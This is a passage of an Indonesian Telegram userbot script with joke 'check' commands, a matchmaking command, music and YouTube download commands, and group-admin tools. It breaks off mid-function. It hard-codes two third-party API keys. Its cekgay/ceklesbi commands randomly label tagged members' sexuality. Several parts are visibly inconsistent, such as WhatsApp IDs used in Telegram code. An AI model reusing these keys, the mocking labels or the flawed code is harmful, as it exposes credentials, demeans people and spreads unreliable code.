    await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ ᴄᴏɴᴛᴏʜ: ${prefix}cekganteng ɴᴀᴍᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴀᴛᴀᴜ ᴛᴀɢ</blockquote>`, parseMode: "html", replyTo: msg.id });
    return;
  }
  
  const jawaban1 = ['ɢᴀɴᴛᴇɴɢ', 'ᴊᴇʟᴇᴋ'];
  const coli1 = jawaban1[Math.floor(Math.random() * jawaban1.length)];
  const jawaban = [randomNomor(2, 100) + `% ${coli1}`, 'Gᴀɴᴛᴇɴɢ', 'Gᴀɴᴛᴇɴɢ ᴀᴍᴀᴛ', 'Lᴜᴍᴀʏᴀɴ', 'Jᴇʟᴇᴋ', 'Jᴇʟᴇᴋ ᴀᴍᴀᴛ'];
  const coli = jawaban[Math.floor(Math.random() * jawaban.length)];
  
  await client.sendMessage(msg.chatId, { 
    message: `<blockquote>📝 *ᴘᴇʀᴛᴀɴʏᴀᴀɴ*: ᴄᴇᴋɢᴀɴᴛᴇɴɢ ${pushname}\n💬 *ᴊᴀᴡᴀʙᴀɴ*: ${coli}</blockquote>`, 
    parseMode: "html", 
    replyTo: msg.id,
    mentions: [pushname]
  });
  return;
}

// Case cekcantik
if (msg.text?.startsWith(`${prefix}cekcantik`)) {
  let pushname = msg.text.replace(`${prefix}cekcantik`, "").trim();
  
  if (!pushname) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ ᴄᴏɴᴛᴏʜ: ${prefix}cekcantik ɴᴀᴍᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴀᴛᴀᴜ ᴛᴀɢ</blockquote>`, parseMode: "html", replyTo: msg.id });
    return;
  }
  
  const jawaban1 = ['ᴄᴀɴᴛɪᴋ', 'ᴊᴇʟᴇᴋ'];
  const coli1 = jawaban1[Math.floor(Math.random() * jawaban1.length)];
  const jawaban = [randomNomor(2, 100) + `% ${coli1}`, 'Cᴀɴᴛɪᴋ', 'Cᴀɴᴛɪᴋ ᴀᴍᴀᴛ', 'Lᴜᴍᴀʏᴀɴ', 'Jᴇʟᴇᴋ', 'Jᴇʟᴇᴋ ᴀᴍᴀᴛ'];
  const coli = jawaban[Math.floor(Math.random() * jawaban.length)];
  
  await client.sendMessage(msg.chatId, { 
    message: `<blockquote>📝 *ᴘᴇʀᴛᴀɴʏᴀᴀɴ*: ᴄᴇᴋᴄᴀɴᴛɪᴋ ${pushname}\n💬 *ᴊᴀᴡᴀʙᴀɴ*: ${coli}</blockquote>`, 
    parseMode: "html", 
    replyTo: msg.id,
    mentions: [pushname]
  });
  return;
}

// Case cekgay
if (msg.text?.startsWith(`${prefix}cekgay`)) {
  let pushname = msg.text.replace(`${prefix}cekgay`, "").trim();
  
  if (!pushname) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ ᴄᴏɴᴛᴏʜ: ${prefix}cekgay ɴᴀᴍᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴀᴛᴀᴜ ᴛᴀɢ</blockquote>`, parseMode: "html", replyTo: msg.id });
    return;
  }
  
  const jawaban1 = ['ɢᴀʏ', 'ʀᴀᴊᴀ ɢᴀʏ'];
  const coli1 = jawaban1[Math.floor(Math.random() * jawaban1.length)];
  const jawaban = [randomNomor(2, 100) + `% ${coli1}`, 'Gᴀʏ', 'Gᴀʏ ᴀᴍᴀᴛ', 'Mᴀʏᴀɴ', 'Gᴀᴋ', 'Gᴀᴋ ʟᴀʜ'];
  const coli = jawaban[Math.floor(Math.random() * jawaban.length)];
  
  await client.sendMessage(msg.chatId, { 
    message: `<blockquote>📝 *ᴘᴇʀᴛᴀɴʏᴀᴀɴ*: ᴄᴇᴋɢᴀʏ ${pushname}\n💬 *ᴊᴀᴡᴀʙᴀɴ*: ${coli}</blockquote>`, 
    parseMode: "html", 
    replyTo: msg.id,
    mentions: [pushname]
  });
  return;
}

// Case ceklesbi
if (msg.text?.startsWith(`${prefix}ceklesbi`)) {
  let pushname = msg.text.replace(`${prefix}ceklesbi`, "").trim();
  
  if (!pushname) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ ᴄᴏɴᴛᴏʜ: ${prefix}ceklesbi ɴᴀᴍᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴀᴛᴀᴜ ᴛᴀɢ</blockquote>`, parseMode: "html", replyTo: msg.id });
    return;
  }
  
  const jawaban1 = ['ʟᴇꜱʙɪ', 'ʀᴀᴛᴜ ʟᴇꜱʙɪ'];
  const coli1 = jawaban1[Math.floor(Math.random() * jawaban1.length)];
  const jawaban = [randomNomor(2, 100) + `% ${coli1}`, 'Lᴇꜱʙɪ', 'Lᴇꜱʙɪ ᴀᴍᴀᴛ', 'Mᴀʏᴀɴ', 'Gᴀᴋ', 'Gᴀᴋ ʟᴀʜ'];
  const coli = jawaban[Math.floor(Math.random() * jawaban.length)];
  
  await client.sendMessage(msg.chatId, { 
    message: `<blockquote>📝 *ᴘᴇʀᴛᴀɴʏᴀᴀɴ*: ᴄᴇᴋʟᴇꜱʙɪ ${pushname}\n💬 *ᴊᴀᴡᴀʙᴀɴ*: ${coli}</blockquote>`, 
    parseMode: "html", 
    replyTo: msg.id,
    mentions: [pushname]
  });
  return;
}

// Case sifat / ceksifat
if (msg.text?.startsWith(`${prefix}sifat`) || msg.text?.startsWith(`${prefix}ceksifat`)) {
  let pushname = msg.text.replace(/^(sifat|ceksifat)/, "").trim();
  
  if (!pushname) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ ᴄᴏɴᴛᴏʜ: ${prefix}sifat ɴᴀᴍᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴀᴛᴀᴜ ᴛᴀɢ</blockquote>`, parseMode: "html", replyTo: msg.id });
    return;
  }
  
  const sifat = [
    'Pᴇʀɪᴀɴɢ', 'Pᴇᴍᴀʟᴜ', 'Pᴇɴᴅɪᴀᴍ', 'Pᴇʀʜᴀᴛɪᴀɴ', 'Sᴀʙᴀʀ', 'Cᴇᴘᴀᴛ ᴍᴀʀᴀʜ',
    'Cᴇʀᴏʙᴏʜ', 'Pᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ', 'Aᴍʙɪꜱɪᴜꜱ', 'Bɪᴊᴀᴋꜱᴀɴᴀ', 'Mᴀɴᴊᴀ', 'Kʀᴇᴀᴛɪꜰ',
    'Pᴇɴʏᴀʏᴀɴɢ', 'Sᴜᴋᴀ ᴍᴇᴍʙᴀɴᴛᴜ', 'Pᴇɴᴅᴇɴᴅᴀᴍ', 'Pᴇɴᴜʜ ꜱᴇᴍᴀɴɢᴀᴛ', 'Rᴏᴍᴀɴᴛɪꜱ',
    'Cᴇᴘᴀᴛ ʙᴏꜱᴀɴ', 'Pᴇɴᴜʜ ʀᴇɴᴄᴀɴᴀ', 'Sᴜᴋᴀ ᴍᴇɴᴜɴᴅᴀ', 'Pᴇɴᴜʜ ʀᴀʜᴀꜱɪᴀ', 'Cᴜᴇᴋ'
  ];
  const coli = sifat[Math.floor(Math.random() * sifat.length)];
  
  await client.sendMessage(msg.chatId, { 
    message: `<blockquote>📝 *ᴘᴇʀᴛᴀɴʏᴀᴀɴ*: ᴄᴇᴋꜱɪꜰᴀᴛ ${pushname}\n💬 *ᴊᴀᴡᴀʙᴀɴ*: ${coli}</blockquote>`, 
    parseMode: "html", 
    replyTo: msg.id,
    mentions: [pushname]
  });
  return;
}

// Case cekhobi / cekhoby / cekhobby
if (msg.text?.startsWith(`${prefix}cekhobi`) || msg.text?.startsWith(`${prefix}cekhoby`) || msg.text?.startsWith(`${prefix}cekhobby`)) {
  let pushname = msg.text.replace(/^(cekhobi|cekhoby|cekhobby)/, "").trim();
  
  if (!pushname) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ ᴄᴏɴᴛᴏʜ: ${prefix}cekhobi ɴᴀᴍᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴀᴛᴀᴜ ᴛᴀɢ</blockquote>`, parseMode: "html", replyTo: msg.id });
    return;
  }
  
  const hobi = [
    'Mᴇᴍʙᴀᴄᴀ ʙᴜᴋᴜ', 'Bᴇʀᴇɴᴀɴɢ', 'Oʟᴀʜʀᴀɢᴀ', 'Mᴇᴍᴀꜱᴀᴋ', 'Mᴇɴᴜʟɪꜱ', 'Bᴇʀᴍᴀɪɴ ɢᴀᴍᴇ',
    'Mᴇɴᴏɴᴛᴏɴ ꜰɪʟᴍ', 'Tʀᴀᴠᴇʟʟɪɴɢ', 'Mᴇɴᴅᴀᴋɪ ɢᴜɴᴜɴɢ', 'Fᴏᴛᴏɢʀᴀꜰɪ', 'Mᴇʟᴜᴋɪꜱ',
    'Mᴜꜱɪᴋ', 'Bᴇʀᴋᴇʙᴜɴ', 'Mᴇɴɢɢᴀᴍʙᴀʀ', 'Cᴏᴅɪɴɢ', 'Yᴏɢᴀ', 'Mᴇᴅɪᴛᴀꜱɪ', 'Mᴇɴᴀʀɪ'
  ];
  const coli = hobi[Math.floor(Math.random() * hobi.length)];
  
  await client.sendMessage(msg.chatId, { 
    message: `<blockquote>📝 *ᴘᴇʀᴛᴀɴʏᴀᴀɴ*: ᴄᴇᴋʜᴏʙɪ ${pushname}\n💬 *ᴊᴀᴡᴀʙᴀɴ*: ${coli}</blockquote>`, 
    parseMode: "html", 
    replyTo: msg.id,
    mentions: [pushname]
  });
  return;
}

// Case jodoh / cekjodoh
if (msg.text?.startsWith(`${prefix}jodoh`) || msg.text?.startsWith(`${prefix}cekjodoh`)) {
  if (!msg.isGroup) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ ᴄᴏᴍᴍᴀɴᴅ ɪɴɪ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ɢʀᴜᴘ!</blockquote>`, parseMode: "html", replyTo: msg.id });
    return;
  }
  
  try {
    let text = msg.text.replace(/^(jodoh|cekjodoh)/, "").trim();
    let target = text ? text.replace(/[@]/g, '').split('@')[0] : msg.sender.split('@')[0];
    
    let member = participants
      .filter(u => typeof u.jid === 'string' && u.jid.includes('@'))
      .map(u => u.jid.split('@')[0]);
    
    if (!member.includes(target)) target = msg.sender.split('@')[0];
    
    let jodoh = member[Math.floor(Math.random() * member.length)];
    let namaTarget = target;
    let namaJodoh = jodoh;
    
    await client.sendMessage(msg.chatId, { 
      message: `<blockquote>💕 *ᴊᴏᴅᴏʜɴʏᴀ ${namaTarget.toUpperCase()}* 💕\n\n@${target} ❤️ @${jodoh}</blockquote>`, 
      parseMode: "html", 
      replyTo: msg.id,
      mentions: [target + '@s.whatsapp.net', jodoh + '@s.whatsapp.net']
    });
  } catch (err) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇꜱᴀʟᴀʜᴀɴ: ${err.message}</blockquote>`, parseMode: "html", replyTo: msg.id });
  }
  return;
}
      
      // .play
      if (msg.text?.startsWith(`${prefix}play`)) {
  (async () => {
    const axios = require('axios');
    const fs = require('fs');
    const path = require('path');
    const os = require('os');
    
    function escapeHtml(str) {
      return (str || "").toString()
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;");
    }
    
    let loading = null;
    let tempFilePath = null;
    
    try {
      const chatId = msg.chatId;
      const query = msg.text.split(" ").slice(1).join(" ").trim();
      const API_KEY = "Yakuza-D8170ABC22604221";
      const BASE_URL = "http://servermcyan.shopryzen.my.id:2234";

      if (!query) {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>Format:</b> .play [judul lagu]</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      loading = await client.sendMessage(chatId, {
        message: `<blockquote>🔍 Mencari lagu: <b>${escapeHtml(query)}</b>...</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      const searchUrl = `${BASE_URL}/api/spotify-search?query=${encodeURIComponent(query)}&apikey=${API_KEY}`;
      const searchRes = await axios.get(searchUrl, { timeout: 15000 });
      const searchData = searchRes.data;

      if (!searchData || !searchData.status || !searchData.data || !searchData.data.tracks || searchData.data.tracks.length === 0) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(()=>{});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ Tidak ditemukan hasil untuk: <b>${escapeHtml(query)}</b></blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const track = searchData.data.tracks[0];
      const trackUrl = track.url;
      const title = track.title || "Unknown";
      const artist = track.artists || "Unknown";
      const trackId = track.id;

      if (!trackUrl) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(()=>{});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ Gagal mendapatkan URL dari hasil pencarian.</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      await client.editMessage(chatId, {
        message: loading.id,
        text: `<blockquote>🎵 Ditemukan: <b>${escapeHtml(title)}</b> - ${escapeHtml(artist)}\n🚀 Mendapatkan link download...</blockquote>`,
        parseMode: "html"
      });

      const downloadUrl = `${BASE_URL}/api/spotify-download-id?id=${trackId}&apikey=${API_KEY}`;
      const downRes = await axios.get(downloadUrl, { timeout: 20000 });
      const downData = downRes.data;

      if (!downData || !downData.status || !downData.data || !downData.data.cdn_url) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(()=>{});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ Gagal mendapatkan link download dari API</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const downloadInfo = downData.data;
      const cdnUrl = downloadInfo.cdn_url;
      const albumInfo = downloadInfo.album || track.album || 'Unknown';
      const durationInfo = downloadInfo.duration || track.duration || '03:36';

      await client.editMessage(chatId, {
        message: loading.id,
        text: `<blockquote>🚀 Mendownload audio: <b>${escapeHtml(title)}</b>...</blockquote>`,
        parseMode: "html"
      });

      try {
        const fileResp = await axios({
          method: 'GET',
          url: cdnUrl,
          responseType: 'stream',
          timeout: 60000,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        });

        const contentLengthHeader = fileResp.headers?.['content-length'] || fileResp.headers?.['Content-Length'];
        const sizeBytes = contentLengthHeader ? Number(contentLengthHeader) : 0;

        const MAX_SEND_BYTES = 50 * 1024 * 1024;
        if (sizeBytes && sizeBytes > MAX_SEND_BYTES) {
          await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(()=>{});
          const sizeMB = Math.round(sizeBytes/1024/1024);
          await client.sendMessage(chatId, {
            message: `<blockquote>❌ File terlalu besar (${sizeMB}MB). Maksimal 50MB.\n\n🔗 Link langsung: ${cdnUrl}</blockquote>`,
            parseMode: "html",
            replyTo: msg.id,
          });
          return;
        }

        const filenameSafe = `${title.replace(/[\/\\<>:"|?*]+/g, "_")} - ${artist.replace(/[\/\\<>:"|?*]+/g, "_")}.mp3`.slice(0, 120) || "track.mp3";
        tempFilePath = path.join(os.tmpdir(), `${filenameSafe}`);
        
        const writer = fs.createWriteStream(tempFilePath);
        
        fileResp.data.pipe(writer);
        
        await new Promise((resolve, reject) => {
          writer.on('finish', resolve);
          writer.on('error', reject);
        });

        if (!fs.existsSync(tempFilePath) || fs.statSync(tempFilePath).size === 0) {
          throw new Error('File hasil download kosong');
        }

        await client.editMessage(chatId, {
          message: loading.id,
          text: `<blockquote>🚀 Mengirim audio: <b>${escapeHtml(title)}</b>...</blockquote>`,
          parseMode: "html"
        });

        const caption = `<blockquote>🎵 <b>${escapeHtml(title)}</b>\n👤 <b>${escapeHtml(artist)}</b>\n💿 <b>${escapeHtml(albumInfo)}</b>\n⏱️ <b>${durationInfo}</b>\n\n📱 <a href="${trackUrl}">Buka di Spotify</a>\n\n© ʙʏ ᴅᴏʏᴀɴɢ 👑</blockquote>`;

        await client.sendMessage(chatId, {
          file: tempFilePath,
          fileName: filenameSafe,
          caption: caption,
          parseMode: "html",
          replyTo: msg.id
        });
        
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(()=>{});
        
        try {
          if (tempFilePath && fs.existsSync(tempFilePath)) {
            fs.unlinkSync(tempFilePath);
          }
        } catch (unlinkErr) {
          console.warn("Gagal hapus file sementara:", unlinkErr.message);
        }

      } catch (downloadErr) {
        console.error("Download/send audio error:", downloadErr.message || downloadErr);
        
        try {
          if (tempFilePath && fs.existsSync(tempFilePath)) {
            fs.unlinkSync(tempFilePath);
          }
        } catch (unlinkErr) {}
        
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(()=>{});
        
        await client.sendMessage(chatId, {
          message: `<blockquote>✅ <b>Lagu ditemukan!</b>\n\n🎵 <b>${escapeHtml(title)}</b>\n👤 <b>${escapeHtml(artist)}</b>\n💿 <b>${escapeHtml(albumInfo)}</b>\n⏱️ <b>${durationInfo}</b>\n\n❌ Gagal mengirim file langsung.\n🔗 <a href="${cdnUrl}">Download Manual via CDN</a>\n\n📱 <a href="${trackUrl}">Buka di Spotify</a>\n\n© ʙʏ ᴅᴏʏᴀɴɢ 👑</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
      }

    } catch (err) {
      console.error("Error in .play command:", err);
      
      try {
        if (tempFilePath && fs.existsSync(tempFilePath)) {
          fs.unlinkSync(tempFilePath);
        }
      } catch (unlinkErr) {}
      
      try {
        if (loading?.id) {
          await client.deleteMessages(msg.chatId, [loading.id], { revoke: true });
        }
      } catch {}
      
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ Gagal memutar lagu\n\nError: <code>${escapeHtml(err.message || String(err))}</code></blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });
    }
  })();
  return;
}
      
      // .del
      if (msg.text?.startsWith(`${prefix}del`)) {
        if (!msg.replyTo) {
          await client.sendMessage(msg.chatId, {
            message: "<blockquote>⚠️ Harus reply ke pesan!</blockquote>",
            parseMode: "html",
            replyTo: msg.id,
          });
          return;
        }
        const replyMsg = await msg.getReplyMessage();
        try {
          await client.deleteMessages(msg.chatId, [msg.id, replyMsg.id], {
            revoke: true,
          });
        } catch (e) {
          await client.sendMessage(msg.chatId, {
            message: `<blockquote>❌ Gagal menghapus: ${e.message}</blockquote>`,
            parseMode: "html",
            replyTo: msg.id,
          });
        }
        return;
      }
      
      // === NEW GROUP COMMANDS (Mode) ===

      // .kick
      if (msg.text?.startsWith(`${prefix}kick`)) {
        if (!msg.isGroup) return;
        if (!msg.replyTo) return;
        try {
          const replyMsg = await msg.getReplyMessage();
          await client.kickParticipant(msg.chatId, replyMsg.senderId);
          await client.sendMessage(msg.chatId, { message: "<blockquote>👋 Bye!</blockquote>", parseMode: "html", replyTo: msg.id });
        } catch (e) {
          await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Gagal kick: ${e.message}</blockquote>`, parseMode: "html", replyTo: msg.id });
        }
        return;
      }

      // .tagall
      if (msg.text?.startsWith(`${prefix}tagall`)) {
  (async () => {
    try {
      if (!msg.isGroup) {
        await client.sendMessage(msg.chatId, { 
          message: "<blockquote>⚠️ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪɢᴜɴᴀᴋᴀɴ ᴅɪ ɢʀᴏᴜᴘ!</blockquote>", 
          parseMode: "html",
          replyTo: msg.id 
        });
        return;
      }

      if (tagallChats.has(msg.chatId.toString())) {
        await client.sendMessage(msg.chatId, { 
          message: "<blockquote>⚠️ ᴛᴀɢᴀʟʟ sᴇᴅᴀɴɢ ʙᴇʀᴊᴀʟᴀɴ ᴅɪ ɢʀᴏᴜᴘ ɪɴɪ</blockquote>", 
          parseMode: "html",
          replyTo: msg.id 
        });
        return;
      }

      tagallChats.add(msg.chatId.toString());

      const customText = msg.text.replace(`${prefix}tagall`, '').trim();
      
      const participants = await client.getParticipants(msg.chatId);
      
      const users = participants
        .filter(u => !u.deleted && !u.bot)
        .map(u => `<a href="tg://user?id=${u.id}">${randomEmoji()}</a>`);

      for (let i = users.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [users[i], users[j]] = [users[j], users[i]];
      }

      let index = 0;
      const batchSize = 5;

      (async function sendBatch() {
        if (!tagallChats.has(msg.chatId.toString())) return;
        
        const batch = users.slice(index, index + batchSize);
        if (batch.length === 0) {
          tagallChats.delete(msg.chatId.toString());
          return;
        }
        
        try {
          let messageText = "";
          if (customText) {
            messageText = `<b>${customText}</b>\n\n`;
          } else {
            messageText = "📢 <b>TAG ALL</b>\n\n";
          }
          messageText += batch.join(" ");
          
          await client.sendMessage(msg.chatId, {
            message: messageText,
            parseMode: "html",
            replyTo: msg.id
          });
        } catch (err) {
          console.error("Error sending tagall batch:", err);
        }
        
        index += batchSize;
        setTimeout(sendBatch, 2000);
      })();

    } catch (err) {
      console.error("❌ Tagall Error:", err);
      tagallChats.delete(msg.chatId.toString());
      await client.sendMessage(msg.chatId, {
        message: "<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ sᴀᴀᴛ ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ ᴛᴀɢᴀʟʟ</blockquote>",
        parseMode: "html",
        replyTo: msg.id
      });
    }
  })();
  return;
}

// .batal
if (msg.text?.startsWith(`${prefix}batal`)) {
  (async () => {
    try {
      if (!msg.isGroup) {
        await client.sendMessage(msg.chatId, { 
          message: "<blockquote>⚠️ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪɢᴜɴᴀᴋᴀɴ ᴅɪ ɢʀᴏᴜᴘ!</blockquote>", 
          parseMode: "html",
          replyTo: msg.id 
        });
        return;
      }

      if (!tagallChats.has(msg.chatId.toString())) {
        await client.sendMessage(msg.chatId, { 
          message: "<blockquote>❌ ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴘᴇʀɪɴᴛᴀʜ ᴛᴀɢᴀʟʟ ʏᴀɴɢ ʙᴇʀᴊᴀʟᴀɴ</blockquote>", 
          parseMode: "html",
          replyTo: msg.id 
        });
        return;
      }

      tagallChats.delete(msg.chatId.toString());
      
      await client.sendMessage(msg.chatId, { 
        message: "<blockquote>✅ ᴛᴀɢᴀʟʟ ʙᴇʀʜᴀsɪʟ ᴅɪʙᴀᴛᴀʟᴋᴀɴ</blockquote>", 
        parseMode: "html",
        replyTo: msg.id 
      });
      
    } catch (err) {
      console.error("❌ Batal Tagall Error:", err);
      await client.sendMessage(msg.chatId, {
        message: "<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ sᴀᴀᴛ ᴍᴇᴍʙᴀᴛᴀʟᴋᴀɴ ᴛᴀɢᴀʟʟ</blockquote>",
        parseMode: "html",
        replyTo: msg.id
      });
    }
  })();
  return;
}

      // .hidetag
      if (msg.text?.startsWith(`${prefix}hidetag`)) {
        if (!msg.isGroup) return;
        const message = text.split(" ").slice(1).join(" ");
        if (!message) {
          await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ Format salah!\nGunakan: ${prefix}hidetag <teks></blockquote>`, parseMode: "html", replyTo: msg.id });
          return;
        }

        await client.sendMessage(msg.chatId, { message: message, parseMode: "html", replyTo: msg.id });
        return;
      }

      // .linkgroup
      if (msg.text?.startsWith(`${prefix}linkgroup`)) {
        if (!msg.isGroup) return;
        try {
          const invite = await client.invoke(new Api.messages.ExportChatInvite({
            peer: msg.chatId,
            legacyRevokePermanent: false,
            requestNeeded: false
          }));
          await client.sendMessage(msg.chatId, { message: `<blockquote>🔗 <b>Link Group:</b>\n${invite.link}</blockquote>`, parseMode: "html", replyTo: msg.id });
        } catch (e) {
          await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Gagal ambil link: ${e.message}</blockquote>`, parseMode: "html", replyTo: msg.id });
        }
        return;
      }

      // .setname
      if (msg.text?.startsWith(`${prefix}setname`)) {
        if (!msg.isGroup) return;
        const name = text.split(" ").slice(1).join(" ");
        if (!name) {
          await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ Format salah!\nGunakan: ${prefix}setname <nama></blockquote>`, parseMode: "html", replyTo: msg.id });
          return;
        }
        try {
          await client.invoke(new Api.channels.EditTitle({ channel: msg.chatId, title: name }));
          await client.sendMessage(msg.chatId, { message: `<blockquote>✅ Nama grup diganti ke: ${name}</blockquote>`, parseMode: "html", replyTo: msg.id });
        } catch (e) {
          try {
            await client.invoke(new Api.messages.EditChatTitle({ chatId: msg.chatId, title: name }));
            await client.sendMessage(msg.chatId, { message: `<blockquote>✅ Nama grup diganti ke: ${name}</blockquote>`, parseMode: "html", replyTo: msg.id });
          } catch (e2) {
            await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Gagal ganti nama: ${e.message}</blockquote>`, parseMode: "html", replyTo: msg.id });
          }
        }
        return;
      }

      // .setdesc
      if (msg.text?.startsWith(`${prefix}setdesc`)) {
        if (!msg.isGroup) return;
        const desc = text.split(" ").slice(1).join(" ");
        if (!desc) {
          await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ Format salah!\nGunakan: ${prefix}setdesc <deskripsi></blockquote>`, parseMode: "html", replyTo: msg.id });
          return;
        }
        try {
          await client.invoke(new Api.messages.EditChatAbout({ peer: msg.chatId, about: desc }));
          await client.sendMessage(msg.chatId, { message: `<blockquote>✅ Deskripsi grup diganti.</blockquote>`, parseMode: "html", replyTo: msg.id });
        } catch (e) {
          await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Gagal ganti deskripsi: ${e.message}</blockquote>`, parseMode: "html", replyTo: msg.id });
        }
        return;
      }
      
      // .yt
       if (msg.text?.startsWith(`${prefix}yt`)) {
    try {
        const args = text.split(" ").slice(1);
        if (args.length < 1) {
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}yt judul</blockquote>`,
                parseMode: "html",
                replyTo: msg.id,
            });
            return;
        }

        const query = args.join(" ");
        const progressMsg = await client.sendMessage(msg.chatId, {
            message: `<blockquote>🚀 ᴍᴇɴᴄᴀʀɪ <b>${query}</b>...</blockquote>`,
            parseMode: "html",
            replyTo: msg.id,
        });

        try {
            const searchResult = await yts(query);
            if (!searchResult.videos.length) {
                throw new Error('ᴠɪᴅᴇᴏ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ');
            }

            const video = searchResult.videos[0];
            const youtubeUrl = video.url;
            
            await client.editMessage(msg.chatId, {
                message: progressMsg.id,
                text: `<blockquote>🚀 ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ: <b>${video.title}</b></blockquote>`,
                parseMode: "html"
            });

            const downloadApis = [
                `https://api.botcahx.eu.org/api/dowloader/yt?url=${encodeURIComponent(youtubeUrl)}&apikey=XYCoolcraftNihBoss`
            ];

            let downloadUrl = null;
            let apiError = null;

            for (const apiUrl of downloadApis) {
                try {
                    
                    const response = await fetch(apiUrl, { 
                        timeout: 10000,
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        }
                    });
                    
                    if (!response.ok) {
                        console.log(`❌ API ${apiUrl.split('?')[0]} failed: ${response.status}`);
                        continue;
                    }
                    
                    const data = await response.json();
                    
                    if (apiUrl.includes('botcahx')) {
                        if (data.status && data.result && data.result.mp4) {
                            downloadUrl = data.result.mp4;
                            console.log(`✅ Botcahx API success`);
                            break;
                        }
                    }                     
                } catch (apiError) {
                    console.log(`⚠️ API error: ${apiError.message}`);
                    continue;
                }
            }

            if (!downloadUrl) {
                try {
                    const fallbackResponse = await fetch(`https://api.ytmp3.cc/?url=${encodeURIComponent(youtubeUrl)}`);
                    if (fallbackResponse.ok) {
                        const fallbackData = await fallbackResponse.json();
                        if (fallbackData.download && fallbackData.download.includes('.mp4')) {
                            downloadUrl = fallbackData.download;
                            console.log(`✅ Fallback ytmp3 API success`);
                        }
                    }
                } catch (fallbackError) {
                    console.log(`❌ All APIs failed`);
                }
            }

            if (!downloadUrl) {
                throw new Error('ɢᴀɢᴀʟ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟɪɴᴋ ᴅᴏᴡɴʟᴏᴀᴅ ᴅᴀʀɪ sᴇᴍᴜᴀ ᴀᴘɪ');
            }

            console.log(`🔗 Final download URL: ${downloadUrl}`);
            
            await client.editMessage(msg.chatId, {
                message: progressMsg.id,
                text: `<blockquote>🚀 ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴅᴇᴏ...\n\n🎬 <b>${video.title}</b></blockquote>`,
                parseMode: "html"
            });

            let videoBuffer = null;
            
            try {
                const videoResponse = await fetch(downloadUrl, { 
                    timeout: 120000,
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Connection': 'keep-alive'
                    }
                });
                
                if (!videoResponse.ok) {
                    throw new Error(`Download failed: ${videoResponse.status}`);
                }
                
                const videoArrayBuffer = await videoResponse.arrayBuffer();
                videoBuffer = Buffer.from(videoArrayBuffer);
                
            } catch (downloadError) {
                console.log(`❌ Direct download failed: ${downloadError.message}`);
                
                try {
                    console.log(`🔄 Trying stream download...`);
                    const { default: axios } = await import('axios');
                    
                    const streamResponse = await axios({
                        method: 'GET',
                        url: downloadUrl,
                        responseType: 'arraybuffer',
                        timeout: 120000,
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        }
                    });
                    
                    videoBuffer = Buffer.from(streamResponse.data);
                    console.log(`✅ Stream download success`);
                    
                } catch (streamError) {
